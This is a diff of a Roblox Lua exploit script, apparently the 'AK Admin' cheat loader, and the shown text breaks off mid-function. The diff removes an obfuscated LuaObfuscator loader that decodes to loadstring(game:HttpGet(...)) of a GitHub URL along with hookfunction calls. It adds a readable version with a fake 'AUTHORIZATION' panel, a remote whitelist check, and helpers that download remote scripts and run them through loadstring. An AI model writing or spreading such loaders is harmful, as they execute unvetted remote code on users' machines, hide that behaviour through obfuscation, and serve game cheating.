@@ -1,12 +1,628 @@
---[[
- .____                  ________ ___.    _____                           __                
- |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
- |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
- |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
- |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
-         \/          \/         \/    \/                \/     \/     \/                   
-          \_Welcome to LuaObfuscator.com   (Alpha 0.10.8) ~  Much Love, Ferib 
+local TweenService = game:GetService("TweenService")
+local Players = game:GetService("Players")
+local CoreGui = game:GetService("CoreGui")
+local HttpService = game:GetService("HttpService")
+local setclipboard = setclipboard or function() warn("Clipboard function not available") end
 
-]]--
+-- Utility functions
+local function tween(inst, props, time)
+    return TweenService:Create(inst, TweenInfo.new(time or 0.5, Enum.EasingStyle.Quart), props):Play()
+end
 
-local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30) if (v1(v30,2)==81) then local v82=0;while true do if (v82==0) then v19=v0(v3(v30,1,1));return "";end end else local v83=v2(v0(v30,16));if v19 then local v90=v5(v83,v19);v19=nil;return v90;else return v83;end end end);local function v20(v31,v32,v33) if v33 then local v84=0 + 0 ;local v85;while true do if (v84==(0 -0)) then v85=(v31/(2^(v32-(2 -(878 -(282 + 595))))))%((3 -1)^(((v33-(2 -1)) -(v32-1)) + (620 -(555 + 64)))) ;return v85-(v85%(932 -(857 + 74))) ;end end else local v86=(570 -(367 + 201))^(v32-(928 -(214 + 713))) ;return (((v31%(v86 + v86))>=v86) and 1) or (0 + 0) ;end end local function v21() local v34=1637 -(1523 + 114) ;local v35;while true do if ((1 + 0)==v34) then return v35;end if (v34==(0 -0)) then v35=v1(v16,v18,v18);v18=v18 + (1066 -((295 -227) + 997)) ;v34=1271 -(226 + (1161 -(32 + 85))) ;end end end local function v22() local v36,v37=v1(v16,v18,v18 + 2 + 0 );v18=v18 + 1 + 1 ;return (v37 * 256) + v36 ;end local function v23() local v38=957 -(892 + 65) ;local v39;local v40;local v41;local v42;while true do if (v38==((2 + 0) -1)) then return (v42 * (31011612 -14234396)) + (v41 * 65536) + (v40 * (469 -(1210 -(915 + 82)))) + v39 ;end if (v38==((991 -641) -(87 + 263))) then v39,v40,v41,v42=v1(v16,v18,v18 + (955 -(802 + 150)) );v18=v18 + (10 -6) ;v38=181 -(67 + 113) ;end end end local function v24() local v43=v23();local v44=v23();local v45=(1487 -(998 + 488)) + 0 ;local v46=(v20(v44,1 -(0 + 0) ,1207 -(1069 + 118) ) * ((4 -2)^(69 -(31 + 6)))) + v43 ;local v47=v20(v44,4 + (789 -(201 + 571)) ,31);local v48=((v20(v44,32)==(1139 -(116 + 1022))) and  -(4 -3)) or (1 -0) ;if (v47==(0 + 0 + 0)) then if (v46==(791 -(368 + 423))) then return v48 * (0 -0) ;else v47=19 -(10 + 8) ;v45=0 -(0 -0) ;end elseif (v47==(2489 -(416 + 26))) then return ((v46==(0 -0)) and (v48 * ((1 + 0)/(0 -0)))) or (v48 * NaN) ;end return v8(v48,v47-(1461 -(145 + 293)) ) * (v45 + (v46/((432 -(44 + (1370 -984)))^52))) ;end local function v25(v49) local v50=(2957 -2098) -(814 + 45) ;local v51;local v52;while true do if (v50==(2 -1)) then v51=v3(v16,v18,(v18 + v49) -(1 + 0) );v18=v18 + v49 ;v50=1 + 1 ;end if ((885 -(261 + 624))==v50) then v51=nil;if  not v49 then v49=v23();if (v49==((1747 -(760 + 987)) -0)) then return "";end end v50=1081 -(1020 + 60) ;end if (v50==(1425 -(630 + 793))) then v52={};for v91=3 -2 , #v51 do v52[v91]=v2(v1(v3(v51,v91,v91)));end v50=14 -11 ;end if (v50==(2 + 1)) then return v6(v52);end end end local v26=v23;local function v27(...) return {...},v12("#",...);end local function v28() local v53=(function() return 0;end)();local v54=(function() return;end)();local v55=(function() return;end)();local v56=(function() return;end)();local v57=(function() return;end)();local v58=(function() return;end)();local v59=(function() return;end)();local v60=(function() return;end)();while true do local v67=(function() return 0 + 0 ;end)();while true do if (v67==1) then if (v53==3) then for v99= #"|",v23() do local v100=(function() return v21();end)();if (v20(v100, #"]", #"<")==(0 -0)) then local v102=(function() return 0;end)();local v103=(function() return;end)();local v104=(function() return;end)();local v105=(function() return;end)();while true do if (v102==(10 -7)) then if (v20(v104, #"xnx", #"asd")== #" ") then v105[ #"http"]=(function() return v60[v105[ #"asd1"]];end)();end v55[v99]=(function() return v105;end)();break;end if (v102==0) then local v114=(function() return 867 -(550 + 317) ;end)();while true do if (v114==0) then v103=(function() return v20(v100,2, #"xxx");end)();v104=(function() return v20(v100, #"asd1",8 -2 );end)();v114=(function() return 1;end)();end if (v114==1) then v102=(function() return 1 -0 ;end)();break;end end end if (v102==(2 -1)) then local v115=(function() return 0;end)();local v116=(function() return;end)();while true do if (v115~=0) then else v116=(function() return 0;end)();while true do if (v116~=0) then else v105=(function() return {v22(),v22(),nil,nil};end)();if (v103==(1665 -(970 + 695))) then local v296=(function() return 0 -0 ;end)();local v297=(function() return;end)();while true do if (v296~=0) then else v297=(function() return 0;end)();while true do if (v297~=(1990 -(582 + 1408))) then else v105[ #"xnx"]=(function() return v22();end)();v105[ #"0313"]=(function() return v22();end)();break;end end break;end end elseif (v103== #" ") then v105[ #"gha"]=(function() return v23();end)();elseif (v103==2) then v105[ #"nil"]=(function() return v23() -((6 -4)^(19 -3)) ;end)();elseif (v103~= #"xnx") then else local v311=(function() return 0 -0 ;end)();local v312=(function() return;end)();while true do if (v311~=(1824 -(1195 + 629))) then else v312=(function() return 0 -0 ;end)();while true do if (0~=v312) then else v105[ #"nil"]=(function() return v23() -((243 -(187 + 54))^16) ;end)();v105[ #"0836"]=(function() return v22();end)();break;end end break;end end end v116=(function() return 781 -(162 + 618) ;end)();end if (v116==(1 + 0)) then v102=(function() return 2;end)();break;end end break;end end end if (v102==(2 + 0)) then if (v20(v104, #"[", #"{")~= #"{") then else v105[3 -1 ]=(function() return v60[v105[2 -0 ]];end)();end if (v20(v104,1 + 1 ,1638 -(1373 + 263) )== #",") then v105[ #"nil"]=(function() return v60[v105[ #"-19"]];end)();end v102=(function() return 3;end)();end end end end for v101= #"~",v23() do v56,v101,v28=(function() return v54(v56,v101,v28);end)();end return v58;end if (v53==(1002 -(451 + 549))) then local v97=(function() return 0;end)();while true do if ((0 + 0)==v97) then v60=(function() return {};end)();for v108= #" ",v59 do local v109=(function() return 0 -0 ;end)();local v110=(function() return;end)();local v111=(function() return;end)();local v112=(function() return;end)();while true do if (v109==1) then v112=(function() return nil;end)();while true do if ((0 -0)~=v110) then else local v245=(function() return 1384 -(746 + 638) ;end)();while true do if (v245~=(0 + 0)) then else v111=(function() return v21();end)();v112=(function() return nil;end)();v245=(function() return 1 -0 ;end)();end if (v245~=(342 -(218 + 123))) then else v110=(function() return 1582 -(1535 + 46) ;end)();break;end end end if (v110==(1 + 0)) then if (v111== #"|") then v112=(function() return v21()~=0 ;end)();elseif (v111==(1 + 1)) then v112=(function() return v24();end)();elseif (v111~= #"xxx") then else v112=(function() return v25();end)();end v60[v108]=(function() return v112;end)();break;end end break;end if (v109==(560 -(306 + 254))) then v110=(function() return 0;end)();v111=(function() return nil;end)();v109=(function() return 1;end)();end end end v97=(function() return 1 + 0 ;end)();end if (v97==1) then v58[ #"91("]=(function() return v21();end)();v53=(function() return 5 -2 ;end)();break;end end end break;end if (v67==0) then if ((1467 -(899 + 568))==v53) then local v98=(function() return 0 + 0 ;end)();while true do if (v98==(2 -1)) then v56=(function() return {};end)();v53=(function() return 1;end)();break;end if (v98==0) then local v107=(function() return 0;end)();while true do if (v107==(604 -(268 + 335))) then v98=(function() return 291 -(60 + 230) ;end)();break;end if (v107==(572 -(426 + 146))) then v54=(function() return function(v155,v156,v157) local v158=(function() return 0;end)();local v159=(function() return;end)();while true do if (v158==(0 + 0)) then v159=(function() return 1456 -(282 + 1174) ;end)();while true do if (v159~=0) then else local v298=(function() return 0;end)();while true do if ((811 -(569 + 242))==v298) then v155[v156-#"!" ]=(function() return v157();end)();return v155,v156,v157;end end end end break;end end end;end)();v55=(function() return {};end)();v107=(function() return 2 -1 ;end)();end end end end end if ((1 + 0)~=v53) then else v57=(function() return {};end)();v58=(function() return {v55,v56,nil,v57};end)();v59=(function() return v23();end)();v53=(function() return 2;end)();end v67=(function() return 1;end)();end end end end local function v29(v61,v62,v63) local v64=v61[1025 -(706 + 318) ];local v65=v61[1253 -(721 + 530) ];local v66=v61[(3160 -(927 + 959)) -(945 + 326) ];return function(...) local v68=v64;local v69=v65;local v70=v66;local v71=v27;local v72=2 -1 ;local v73= -(1 + 0);local v74={};local v75={...};local v76=v12("#",...) -1 ;local v77={};local v78={};for v87=0,v76 do if ((v87>=v70) or (1731>=2115)) then v74[v87-v70 ]=v75[v87 + 1 + 0 ];else v78[v87]=v75[v87 + (1501 -(1408 + 92)) ];end end local v79=(v76-v70) + 1 ;local v80;local v81;while true do v80=v68[v72];v81=v80[1087 -(461 + 625) ];if ((4429>=3120) and (v81<=23)) then if (v81<=((4378 -3079) -(993 + 295))) then if ((969<=1905) and (v81<=((733 -(16 + 716)) + (7 -3)))) then if (v81<=(1173 -(418 + 753))) then if ((v81<=(0 + 0)) or (3332==1473)) then v78[v80[1 + 1 ]]=v78[v80[1 + 2 ]][v80[2 + 2 ]];elseif (v81>(530 -(406 + 123))) then v78[v80[2]]=v62[v80[1772 -(1749 + (117 -(11 + 86))) ]];elseif v78[v80[1 + 1 ]] then v72=v72 + (1323 -(1249 + 73)) ;else v72=v80[2 + 1 ];end elseif (v81<=(1148 -(466 + 679))) then for v134=v80[4 -2 ],v80[8 -5 ] do v78[v134]=nil;end elseif (v81>(1904 -(106 + 1794))) then local v162=0 + 0 ;local v163;while true do if (v162==(1 + 0)) then for v278=v163,v73 do local v279=v74[v278-v163 ];v78[v278]=v279;end break;end if ((v162==(0 -0)) or (4051<=1157)) then v163=v80[5 -3 ];v73=(v163 + v79) -(115 -(4 + (268 -158))) ;v162=585 -(57 + 527) ;end end else local v164=1427 -(41 + 1386) ;local v165;local v166;local v167;local v168;while true do if ((604<2881) and (v164==1)) then v73=(v167 + v165) -(104 -(17 + 86)) ;v168=0 + 0 ;v164=3 -1 ;end if (v164==(5 -3)) then for v281=v165,v73 do local v282=166 -(122 + 44) ;while true do if (v282==0) then v168=v168 + (1 -0) ;v78[v281]=v166[v168];break;end end end break;end if ((v164==(0 -0)) or (900==3377)) then v165=v80[(287 -(175 + 110)) + 0 ];v166,v167=v71(v78[v165](v78[v165 + 1 + 0 ]));v164=1 -0 ;end end end elseif ((4459>591) and (v81<=8)) then if (v81<=(71 -(30 + 35))) then v78[v80[2 + 0 ]]=v78[v80[1260 -(1043 + 214) ]][v80[15 -11 ]];elseif (v81>(1219 -(323 + 889))) then v78[v80[5 -3 ]]=v80[583 -(361 + 219) ];else v78[v80[322 -(53 + 267) ]]=v80[1 + 2 ];end elseif (v81<=(422 -(15 + (1004 -606)))) then local v121=v80[984 -(18 + 964) ];do return v13(v78,v121,v121 + v80[11 -8 ] );end elseif ((3398>=2395) and (v81>10)) then v78[v80[2 + 0 ]]=v78[v80[14 -11 ]];else v78[v80[2 + 0 ]]();end elseif (v81<=(867 -(20 + 830))) then if (v81<=14) then if (v81<=(10 + 2)) then v78[v80[(1924 -(503 + 1293)) -(116 + 10) ]]=v78[v80[1 + (5 -3) ]];elseif (v81>13) then if (v80[2]==v78[v80[742 -(542 + 196) ]]) then v72=v72 + (1 -0) ;else v72=v80[1 + 2 ];end else do return;end end elseif (v81<=(8 + 7)) then v72=v80[3 + 0 ];elseif (v81>16) then local v175=0 + 0 ;local v176;local v177;while true do if ((v175==((1063 -(810 + 251)) -1)) or (2183>=2824)) then v78[v176 + (2 -1) ]=v177;v78[v176]=v177[v80[1555 -(1126 + 425) ]];break;end if (v175==(405 -(118 + 287))) then v176=v80[2];v177=v78[v80[3 + 0 ]];v175=3 -2 ;end end elseif (v78[v80[1123 -(118 + 1003) ]]==v78[v80[11 -7 ]]) then v72=v72 + 1 ;else v72=v80[380 -(142 + 235) ];end elseif ((1936==1936) and (v81<=(90 -70))) then if ((v81<=(4 + 14)) or (4832<4313)) then local v125=v80[2];do return v78[v125](v13(v78,v125 + (978 -(553 + 424)) ,v73));end elseif (v81==(35 -16)) then local v178=0 + 0 + 0 ;local v179;local v180;while true do if ((4088>3874) and (v178==1)) then for v283=1 + 0 , #v77 do local v284=v77[v283];for v292=0, #v284 do local v293=v284[v292];local v294=v293[1 + 0 ];local v295=v293[2];if ((v294==v78) and (v295>=v179)) then v180[v295]=v294[v295];v293[1]=v180;end end end break;end if ((0 + 0)==v178) then v179=v80[2 + 0 ];v180={};v178=1;end end else local v181=v80[4 -2 ];v78[v181](v13(v78,v181 + 1 ,v73));end elseif (v81<=(58 -37)) then v78[v80[4 -(2 + 0) ]]();elseif (v81>(7 + 15)) then local v182=v80[9 -7 ];v78[v182](v13(v78,v182 + (754 -(239 + (1047 -(43 + 490)))) ,v73));else local v183=0 + 0 ;local v184;local v185;local v186;local v187;while true do if (v183==(1331 -(797 + 532))) then for v285=v184,v73 do local v286=0 + (733 -(711 + 22)) ;while true do if (v286==(0 + 0)) then v187=v187 + (2 -1) ;v78[v285]=v185[v187];break;end end end break;end if (v183==(1203 -(373 + (3206 -2377)))) then v73=(v186 + v184) -(732 -(476 + 255)) ;v187=1130 -((1228 -(240 + 619)) + 761) ;v183=2 + 0 ;end if ((4332==4332) and (v183==(0 + 0))) then v184=v80[2 -0 ];v185,v186=v71(v78[v184](v78[v184 + (1 -0) ]));v183=(379 -140) -(64 + 174) ;end end end elseif ((3999>=2900) and (v81<=35)) then if (v81<=(2 + 27)) then if ((v81<=(4 + 22)) or (2525>4064)) then if ((4371==4371) and (v81<=(34 -(1754 -(1344 + 400))))) then for v136=v80[(743 -(255 + 150)) -(144 + 192) ],v80[219 -(42 + 138 + 36) ] do v78[v136]=nil;end elseif (v81>(11 + 8 + 6)) then do return v78[v80[2]];end else local v188=0;local v189;local v190;local v191;local v192;while true do if ((v188==(1 + 0)) or (266>4986)) then v73=(v191 + v189) -(1 + 0) ;v192=1504 -(363 + 1141) ;v188=2;end if (v188==2) then for v287=v189,v73 do v192=v192 + (1581 -(1183 + (1696 -1299))) ;v78[v287]=v190[v192];end break;end if ((0 -0)==v188) then v189=v80[2 + (0 -0) ];v190,v191=v71(v78[v189](v13(v78,v189 + (1740 -(404 + 1335)) ,v80[3 + 0 ])));v188=1976 -(1913 + 62) ;end end end elseif ((1991>=925) and (v81<=(18 + 9))) then if v78[v80[5 -3 ]] then v72=v72 + ((2340 -(183 + 223)) -(565 + 1368)) ;else v72=v80[3 -0 ];end elseif (v81>(105 -77)) then do return v78[v80[1663 -(1477 + 184) ]];end else local v194=v80[2 -0 ];do return v13(v78,v194,v73);end end elseif ((455<2053) and (v81<=(30 + 2))) then if (v81<=(886 -(564 + 292))) then local v126=v80[2 -(0 + 0) ];local v127={};for v138=2 -(1 + 0) , #v77 do local v139=v77[v138];for v195=337 -(10 + 327) , #v139 do local v196=v139[v195];local v197=v196[305 -(244 + 60) ];local v198=v196[2 + 0 ];if ((v197==v78) and (v198>=v126)) then v127[v198]=v197[v198];v196[477 -(29 + 12 + 435) ]=v127;end end end elseif (v81>(1032 -(938 + 63))) then if (v78[v80[2 + (338 -(118 + 220)) ]]==v78[v80[1129 -(936 + 189) ]]) then v72=v72 + 1 + 0 ;else v72=v80[1616 -(1565 + 48) ];end else v78[v80[2 + 0 ]]=v63[v80[1141 -(782 + 356) ]];end elseif (v81<=33) then local v128=267 -(176 + 91) ;local v129;while true do if (v128==(0 -(0 + 0))) then v129=v80[2 -0 ];v78[v129]=v78[v129](v13(v78,v129 + (1093 -(975 + 117)) ,v73));break;end end elseif ((v81==(1909 -(157 + 1718))) or (826==4851)) then local v201=v80[2 + 0 ];v73=(v201 + v79) -(3 -2) ;for v227=v201,v73 do local v228=v74[v227-v201 ];v78[v227]=v228;end else local v202=0;local v203;local v204;while true do if (1==v202) then v78[v203 + (3 -(451 -(108 + 341))) ]=v204;v78[v203]=v204[v80[1022 -(697 + 321) ]];break;end if (v202==0) then v203=v80[5 -3 ];v204=v78[v80[5 -(1 + 1) ]];v202=(8 -6) -(1494 -(711 + 782)) ;end end end elseif (v81<=(16 + 25)) then if ((183==183) and (v81<=(70 -32))) then if (v81<=(96 -(115 -55))) then if (v78[v80[1229 -(322 + 905) ]]==v80[615 -(602 + 9) ]) then v72=v72 + (1190 -(449 + 740)) ;else v72=v80[875 -(826 + 46) ];end elseif ((1159<=1788) and (v81==(984 -(245 + 702)))) then local v206=v80[2];do return v78[v206](v13(v78,v206 + (3 -2) ,v73));end else local v207=0 + 0 ;local v208;while true do if (v207==(469 -(270 + 199))) then v208=v80[1900 -(260 + 1638) ];do return v13(v78,v208,v73);end break;end end end elseif (v81<=((156 + 323) -((2201 -(580 + 1239)) + 58))) then if (v78[v80[2]]==v80[12 -8 ]) then v72=v72 + 1 + 0 ;else v72=v80[3];end elseif (v81>40) then v78[v80[(8 -5) -1 ]]=v62[v80[8 -5 ]];else local v212=v80[2];local v213,v214=v71(v78[v212](v13(v78,v212 + (1206 -(902 + 303)) ,v80[5 -2 ])));v73=(v214 + v212) -(2 -(1 + 0)) ;local v215=0 + 0 ;for v230=v212,v73 do local v231=1690 -(1121 + 569) ;while true do if (((214 -(1 + 21 + 192))==v231) or (3507>4318)) then v215=v215 + 1 + 0 ;v78[v230]=v213[v215];break;end end end end elseif (v81<=44) then if ((v81<=(725 -(483 + 200))) or (3075<=2965)) then local v130=v69[v80[1466 -((3665 -2261) + 59) ]];local v131;local v132={};v131=v10({},{__index=function(v140,v141) local v142=0;local v143;while true do if ((0 -0)==v142) then v143=v132[v141];return v143[1 -0 ][v143[2]];end end end,__newindex=function(v144,v145,v146) local v147=0;local v148;while true do if (v147==(765 -(468 + 297))) then v148=v132[v145];v148[563 -(334 + 228) ][v148[2]]=v146;break;end end end});for v149=3 -(1169 -(645 + 522)) ,v80[8 -4 ] do v72=v72 + (1 -0) ;local v150=v68[v72];if (v150[1]==(4 + (1798 -(1010 + 780)))) then v132[v149-(237 -(141 + 95)) ]={v78,v150[6 -3 ]};else v132[v149-1 ]={v62,v150[3 + 0 ]};end v77[ #v77 + 1 + 0 ]=v132;end v78[v80[2 -0 ]]=v29(v130,v131,v63);elseif (v81==(26 + 17)) then v78[v80[165 -(92 + 71) ]]=v63[v80[8 -5 ]];else do return;end end elseif ((1365<=2011) and (v81<=((1859 -(1045 + 791)) + 23))) then if (v81>45) then local v218=0 -0 ;local v219;while true do if ((v218==0) or (2776>3575)) then v219=v80[2];v78[v219]=v78[v219](v13(v78,v219 + 1 ,v73));break;end end else v72=v80[768 -(574 + 191) ];end elseif (v81==(39 + (19 -11))) then local v221=v69[v80[(9 -2) -4 ]];local v222;local v223={};v222=v10({},{__index=function(v234,v235) local v236=v223[v235];return v236[1][v236[2 + 0 ]];end,__newindex=function(v237,v238,v239) local v240=v223[v238];v240[1][v240[851 -(254 + 595) ]]=v239;end});for v242=127 -(55 + 71) ,v80[4] do v72=v72 + (1 -0) ;local v243=v68[v72];if ((v243[1]==(1802 -(573 + (1722 -(351 + 154))))) or (2554==4804)) then v223[v242-(2 -1) ]={v78,v243[4 -1 ]};else v223[v242-1 ]={v62,v243[3 -0 ]};end v77[ #v77 + 1 + 0 ]=v223;end v78[v80[2]]=v29(v221,v222,v63);elseif (v80[2 -(1574 -(1281 + 293)) ]==v78[v80[810 -(118 + 688) ]]) then v72=v72 + ((315 -(28 + 238)) -(25 + 23)) ;else v72=v80[1 + 2 ];end v72=v72 + 1 ;end end;end return v29(v28(),{},v17)(...);end return v15("LOL!073Q00028Q00030A3Q006C6F6164737472696E6703043Q0067616D6503073Q00482Q747047657403563Q00682Q7470733A2Q2F7261772E67697468756275736572636F6E74656E742E636F6D2F4966796F7564756D70656474686973436F6E67726174732F4D61696E2F726566732F68656164732F6D61696E2F414B41444D494E030C3Q00682Q6F6B66756E6374696F6E030B3Q006E65772Q636C6F7375726500243Q0012083Q00014Q0003000100013Q0026273Q00020001000100040F3Q00020001001208000100013Q002627000100050001000100040F3Q0005000100121F000200023Q00121F000300033Q002011000300030004001208000500054Q0028000300054Q002E00023Q00022Q001500020001000100121F000200063Q0006010002002300013Q00040F3Q0023000100121F000200073Q0006010002002300013Q00040F3Q0023000100121F000200033Q00202Q00020002000400121F000300063Q00121F000400033Q00202Q00040004000400121F000500073Q00062A00063Q000100012Q000C3Q00024Q0004000500064Q001700033Q00012Q001E00025Q00040F3Q0023000100040F3Q0005000100040F3Q0023000100040F3Q000200012Q002C3Q00013Q00013Q00043Q00028Q0003043Q0067616D6503063Q0073656C656374026Q00F03F011A3Q001208000200013Q002627000200010001000100040F3Q00010001001208000300013Q002Q0E000100040001000300040F3Q0004000100121F000400023Q0006103Q00120001000400040F3Q0012000100121F000400033Q001208000500044Q002200066Q002E00043Q00022Q002900055Q000610000400120001000500040F3Q001200012Q0003000400044Q001A000400024Q002900046Q000B00056Q002200066Q002500046Q001C00045Q00040F3Q0004000100040F3Q000100012Q002C3Q00017Q00",v9(),...);
+local function new(class, props)
+    local inst = Instance.new(class)
+    for i, v in pairs(props) do
+        inst[i] = v
+    end
+    return inst
+end
+
+-- Sound effects setup using verified professional sounds
+local function createSound(id, volume)
+    local sound = new("Sound", {
+        SoundId = "rbxassetid://" .. id,
+        Volume = volume or 0.5,
+        Parent = workspace
+    })
+    return sound
+end
+
+local sounds = {
+    slideDown = createSound("12222200", 0.15),     -- Soft slide
+    success = createSound("2027986581", 0.25),       -- Clean success tone
+    failure = createSound("7356986865", 0.25),       -- Professional error
+    slideUp = createSound("12222200", 0.15)        -- Soft slide
+}
+
+-- Cleanup existing GUI
+for _, v in pairs(CoreGui:GetChildren()) do
+    if v.Name == "PremiumAuthGui" then
+        v:Destroy()
+    end
+end
+
+-- Create main GUI
+local gui = new("ScreenGui", {
+    Name = "PremiumAuthGui",
+    IgnoreGuiInset = true,
+    DisplayOrder = 999,
+    Parent = CoreGui
+})
+
+-- Main container
+local main = new("Frame", {
+    Size = UDim2.new(0.4, 0, 0, 50),
+    Position = UDim2.new(0.5, 0, -0.2, 0),
+    AnchorPoint = Vector2.new(0.5, 0),
+    BackgroundColor3 = Color3.fromRGB(35, 35, 40),
+    BackgroundTransparency = 0,
+    Parent = gui
+})
+
+new("UICorner", { CornerRadius = UDim.new(0, 12), Parent = main })
+new("UIStroke", {
+    Color = Color3.fromRGB(80, 80, 90),
+    Thickness = 2,
+    Transparency = 0,
+    Parent = main
+})
+
+-- Player profile picture
+local player = Players.LocalPlayer
+local userId = player.UserId
+
+local profilePic = new("ImageLabel", {
+    Size = UDim2.new(0, 40, 0, 40),
+    Position = UDim2.new(0, 10, 0.5, 0),
+    AnchorPoint = Vector2.new(0, 0.5),
+    BackgroundTransparency = 1,
+    Image = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", userId),
+    Parent = main
+})
+
+-- Text elements with initial transparency
+local title = new("TextLabel", {
+    Size = UDim2.new(1, -70, 0, 20),
+    Position = UDim2.new(0.5, 20, 0, 3),
+    AnchorPoint = Vector2.new(0.5, 0),
+    BackgroundTransparency = 1,
+    TextColor3 = Color3.fromRGB(255, 255, 255),
+    TextSize = 20,
+    Font = Enum.Font.GothamBold,
+    Text = "AUTHORIZATION",
+    TextTransparency = 1,
+    Parent = main
+})
+
+local status = new("TextLabel", {
+    Size = UDim2.new(1, -70, 0, 15),
+    Position = UDim2.new(0.5, 20, 0, 25),
+    AnchorPoint = Vector2.new(0.5, 0),
+    BackgroundTransparency = 1,
+    TextColor3 = Color3.fromRGB(200, 200, 200),
+    TextSize = 16,
+    Font = Enum.Font.GothamMedium,
+    Text = "Verifying access...",
+    TextTransparency = 1,
+    Parent = main
+})
+
+-- Progress bar
+local progressBg = new("Frame", {
+    Size = UDim2.new(0.8, 0, 0, 3),
+    Position = UDim2.new(0.5, 20, 1, -5),
+    AnchorPoint = Vector2.new(0.5, 1),
+    BackgroundColor3 = Color3.fromRGB(45, 45, 50),
+    BackgroundTransparency = 0,
+    Parent = main
+})
+
+new("UICorner", { CornerRadius = UDim.new(1, 0), Parent = progressBg })
+
+local progress = new("Frame", {
+    Size = UDim2.new(0, 0, 1, 0),
+    BackgroundColor3 = Color3.fromRGB(90, 160, 255),
+    BackgroundTransparency = 0,
+    Parent = progressBg
+})
+
+new("UICorner", { CornerRadius = UDim.new(1, 0), Parent = progress })
+
+-- Animation sequence
+local function animate()
+    local scriptURL = "https://raw.githubusercontent.com/fjkdvbjkfvjkfbvjkfbvjkdfhdfjkhvuldfhv/lol/refs/heads/main/Main"
+
+    -- Smooth slide down with sound
+    sounds.slideDown:Play()
+    tween(main, { Position = UDim2.new(0.5, 0, 0, 10) }, 1.2) -- Slower slide down
+    task.wait(0.3)
+    tween(title, { TextTransparency = 0 }, 0.4)
+    task.wait(0.2)
+    tween(status, { TextTransparency = 0 }, 0.4)
+    tween(progress, { Size = UDim2.new(1, 0, 1, 0) }, 0.8)
+
+    -- Check whitelist
+    local whitelistURL = "https://raw.githubusercontent.com/AKadminlol/AK-ADMIN/refs/heads/main/AK%20ADMIN.json"
+
+    local success, result = pcall(function()
+        local response = game:HttpGet(whitelistURL)
+        local data = HttpService:JSONDecode(response)
+        return table.find(data.whitelisted or {}, player.Name) ~= nil
+    end)
+
+    task.wait(0.5) -- Brief pause before result
+
+    if success and result then
+        sounds.success:Play()
+        status.Text = "Access Granted!"
+        tween(status, { TextColor3 = Color3.fromRGB(100, 255, 150) }, 0.4)
+        tween(progress, { BackgroundColor3 = Color3.fromRGB(100, 255, 150) }, 0.4)
+        -- START OF SECOND SCRIPT INSERTION
+        -- Global variable to prevent multiple instances with enhanced check
+        if _G.AKAdminLoaded then
+            local success_second, _ = pcall(function()
+                game:GetService("StarterGui"):SetCore("SendNotification", {
+                    Title = "AK ADMIN",
+                    Text = "Script is already running!",
+                    Duration = 5
+                })
+            end)
+            if not success_second then
+                warn("Failed to show notification, but script is already running")
+            end
+            return
+        end
+
+        -- Initialize global state
+        local errors = {}
+        local services_second = {
+            Players = game:GetService("Players"),
+            Lighting = game:GetService("Lighting"),
+            StarterGui = game:GetService("StarterGui"),
+            CoreGui = game:GetService("CoreGui"),
+            ScriptContext = game:GetService("ScriptContext")
+        }
+
+        -- Robust service getter
+        local function getService_second(serviceName)
+            local service = services_second[serviceName]
+            if not service then
+                local success_getService, result_getService = pcall(game.GetService, game, serviceName)
+                if success_getService then
+                    services_second[serviceName] = result_getService
+                    return result_getService
+                end
+                warn(string.format("Failed to get service %s: %s", serviceName, tostring(result_getService)))
+                return nil
+            end
+            return service
+        end
+
+        -- Enhanced player module loading
+        local function getPlayerModule_second()
+            local player_second = services_second.Players.LocalPlayer
+            if not player_second then
+                for i = 1, 10 do
+                    player_second = services_second.Players.LocalPlayer
+                    if player_second then break end
+                    task.wait(1)
+                end
+                if not player_second then
+                    warn("LocalPlayer not found after 10 seconds")
+                    return nil
+                end
+            end
+
+            local PlayerScripts_second = player_second:WaitForChild("PlayerScripts", 15)
+            if not PlayerScripts_second then
+                warn("PlayerScripts not found after 15 seconds")
+                return nil
+            end
+
+            local PlayerModule_second = PlayerScripts_second:WaitForChild("PlayerModule", 15)
+            if not PlayerModule_second then
+                warn("PlayerModule not found after 15 seconds")
+                return nil
+            end
+
+            return PlayerModule_second
+        end
+
+        -- Enhanced atmosphere and fog handling
+        local function RemoveAtmosphereAndSetFog_second()
+            local success_atmosphere, error_atmosphere = pcall(function()
+                local Lighting_second = getService_second("Lighting")
+                if not Lighting_second then return end
+
+                -- Safely set fog
+                pcall(function() Lighting_second.FogEnd = 100000 end)
+
+                -- Safely remove atmosphere
+                for _, v in ipairs(Lighting_second:GetDescendants()) do
+                    if v:IsA("Atmosphere") then
+                        pcall(function() v:Destroy() end)
+                    end
+                end
+            end)
+            if not success_atmosphere then
+                warn("Failed to modify atmosphere:", error_atmosphere)
+                table.insert(errors, {
+                    type = "atmosphere",
+                    error = error_atmosphere,
+                    time = os.time(),
+                    stack = debug.traceback()
+                })
+            end
+        end
+
+        -- Enhanced HTTP request handling
+        local function safeHttpGet_second(url)
+            if not url or type(url) ~= "string" then
+                warn("Invalid URL provided to safeHttpGet")
+                return nil
+            end
+
+            local tries = 0
+            local maxTries = 3
+
+            while tries < maxTries do
+                local success_httpGet, result_httpGet = pcall(function()
+                    return game:HttpGet(url)
+                end)
+
+                if success_httpGet and result_httpGet then
+                    return result_httpGet
+                end
+
+                tries = tries + 1
+                warn(string.format("Attempt %d/%d failed to fetch URL: %s Error: %s",
+                    tries, maxTries, url, tostring(result_httpGet)))
+
+                if tries < maxTries then
+                    task.wait(1) -- Wait before retry
+                end
+            end
+
+            table.insert(errors, {
+                type = "HttpGet",
+                url = url,
+                error = "Failed after " .. maxTries .. " attempts",
+                time = os.time(),
+                stack = debug.traceback()
+            })
+            return nil
+        end
+
+        -- Enhanced string loading
+        local function safeLoadString_second(source, url)
+            if not source then
+                warn("No source provided to safeLoadString")
+                return
+            end
+
+            local success_loadString, func_loadString = pcall(loadstring, source)
+            if not success_loadString then
